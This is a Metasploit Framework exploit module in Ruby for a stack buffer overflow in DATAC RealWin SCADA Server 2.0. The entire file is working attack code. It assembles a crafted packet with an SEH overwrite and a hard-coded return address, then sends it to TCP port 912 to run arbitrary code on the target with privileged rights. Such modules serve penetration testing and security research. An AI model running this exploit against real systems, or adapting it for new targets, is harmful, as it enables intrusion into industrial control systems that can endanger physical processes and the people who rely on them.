##
# $Id: realwin_scpc_initialize.rb 10734 2010-10-18 21:20:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DATAC RealWin SCADA Server SCPC_SCPC_INITIALIZE Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in DATAC Control
				International RealWin SCADA Server 2.0 (Build 6.1.8.10).
				By sending a specially crafted packet, an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'Luigi Auriemma', 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10734 $',
			'References'     =>
				[
					[ 'URL', 'http://aluigi.altervista.org/adv/realwin_1-adv.txt' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Universal', { 'Ret' => 0x4002da21 } ], # FlexMLang.DLL 8.1.45.19
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 15 2010'))

		register_options([Opt::RPORT(912)], self.class)
	end

	def exploit

		connect

		data =  [0x6a541264].pack('V')
		data << [0x00000002].pack('V')
		data << [0x00001ff4].pack('V')
		data << "\xff\x7f"
		data << rand_text_alpha_upper(226)
		data << generate_seh_payload(target.ret)
		data << rand_text_alpha_upper(10024 - payload.encoded.length)
		data << "\x00"	

		print_status("Trying target #{target.name}...")
		sock.put(data)

		handler
		disconnect

	end

end

